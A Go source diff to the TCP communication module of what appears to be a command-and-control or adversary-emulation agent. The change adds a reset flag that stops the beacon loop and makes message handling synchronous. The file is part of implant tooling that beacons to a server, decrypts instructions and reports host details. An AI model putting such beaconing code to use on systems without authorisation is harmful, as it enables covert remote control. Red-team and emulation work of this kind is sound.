@@ -26,6 +26,10 @@ func (contact TCP) Communicate(agent *util.AgentConfig, beacon Beacon) {
 	   		log.Printf("[-] %s is either unavailable or a firewall is blocking traffic.", agent.Address)
 	   	} else {
 	   		listen(conn, beacon, agent)
+	   		if util.ResetFlag {
+	   			ResetChan<-0
+				break
+			}
 	   	}
 	   	jitterSleep(agent.Sleep, "TCP")
 	}
@@ -39,11 +43,14 @@ func listen(conn net.Conn, beacon Beacon, agent *util.AgentConfig) {
     scanner := bufio.NewScanner(conn)
     for scanner.Scan() {
 		message := strings.TrimSpace(scanner.Text())
-		go respond(conn, beacon, message, agent)
+		respond(conn, beacon, message, agent)
+		if util.ResetFlag {
+			return
+		}
     }
 }
 
-func respond(conn net.Conn, beacon Beacon, message string, agent *util.AgentConfig){
+func respond(conn net.Conn, beacon Beacon, message string, agent *util.AgentConfig) {
 	var tempB Beacon
 	json.Unmarshal([]byte(util.Decrypt(message)), &tempB)
 	beacon.Links = beacon.Links[:0]
@@ -60,6 +67,10 @@ func respond(conn net.Conn, beacon Beacon, message string, agent *util.AgentConf
 	}
 	pwd, _ := os.Getwd()
 	beacon.Pwd = pwd
+	if util.ResetFlag {
+		ResetBeacon = beacon
+		return
+	}
 	bufferedSend(conn, beacon)
 }
 
